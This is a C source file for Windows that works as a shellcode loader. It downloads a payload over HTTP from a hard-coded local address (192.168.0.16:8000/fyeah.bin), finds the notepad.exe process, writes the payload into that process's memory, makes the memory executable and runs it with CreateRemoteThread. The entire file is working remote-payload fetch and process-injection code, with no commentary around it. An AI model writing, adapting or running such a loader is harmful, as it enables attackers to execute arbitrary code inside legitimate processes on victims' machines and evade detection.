#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <wininet.h>
#include <TlHelp32.h>
#pragma comment(lib, "wininet.lib") 


BOOL GetPayloadFromUrl(LPCWSTR lpUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bState = TRUE;

	HINTERNET	hInternet = NULL,

				hInternetFile = NULL;

	DWORD		dwBytesRead = NULL;

	SIZE_T		sSize = NULL;
	PBYTE		pBytes = NULL,
				pTmpBytes = NULL;

	
	
	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);	
	if (hInternet == NULL) {
		bState = FALSE;  goto _EndInetFunction;
	}

	hInternetFile = InternetOpenUrlW(hInternet, lpUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
			bState = FALSE;  goto _EndInetFunction;
		}


	pTmpBytes = (PBYTE)malloc(1024);
	if (pTmpBytes == NULL) {
			bState = FALSE;  goto _EndInetFunction;
		}

	while (InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead) && dwBytesRead != 0) {
	pBytes = (PBYTE)realloc(pBytes, sSize + dwBytesRead);
			if (pBytes == NULL) {
				bState = FALSE;  goto _EndInetFunction;
			}

			memcpy(pBytes + sSize, pTmpBytes, dwBytesRead);
			sSize += dwBytesRead;

			memset(pTmpBytes, 0, 1024);

			if (dwBytesRead < 1024) {
				break;
			}
	}





	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndInetFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);


	if (hInternetFile)
		InternetCloseHandle(hInternetFile);


	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);


	if (pTmpBytes)
		LocalFree(pTmpBytes);


	return bState;
}
	



DWORD GetProcessIdByName(LPCTSTR name)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	DWORD pid = 0;
	PROCESSENTRY32 pe = { 0 };

	if (hSnapshot != INVALID_HANDLE_VALUE) {
		pe.dwSize = sizeof(PROCESSENTRY32);

		CharLowerBuff(pe.szExeFile, lstrlen(pe.szExeFile));

		if (Process32First(hSnapshot, &pe))

		{
			do
			{
				if (lstrcmpi(pe.szExeFile, name) == 0)
				{
					pid = pe.th32ProcessID;
					break;
				}
			} while (Process32Next(hSnapshot, &pe));
		}
		CloseHandle(hSnapshot);
		return pid;
	}
}

int main() {

	BOOL bResult = FALSE;
	PBYTE payload = NULL;
	SIZE_T payloadSize = 0;
	LPWSTR url = NULL;

	

	url = L"http://192.168.0.16:8000/fyeah.bin";
	bResult = GetPayloadFromUrl(url, &payload, &payloadSize);
	if (bResult == FALSE) {
		return 1;
	}
	


	printf("Payload size: %d\n", payloadSize);
	getchar();

	DWORD pid = GetProcessIdByName(L"notepad.exe");
	if (pid == 0) {
		return 1;
	}


	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	if (hProcess == NULL) {
		return 1;
	}

	LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpBaseAddress == NULL) {
		return 1;
	}

	BOOL bWrite = WriteProcessMemory(hProcess, lpBaseAddress, payload, payloadSize, NULL);
	if (bWrite == FALSE) {
		return 1;
	}

	memset(payload, 0, payloadSize);

	DWORD oldProtect;
	BOOL bProtect = VirtualProtectEx(hProcess, lpBaseAddress, payloadSize, PAGE_EXECUTE_READ, &oldProtect);
	if (bProtect == FALSE) {
		return 1;
	}

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, NULL, 0, NULL);
	if (hThread == NULL) {
		return 1;
	}
	return 0;
}
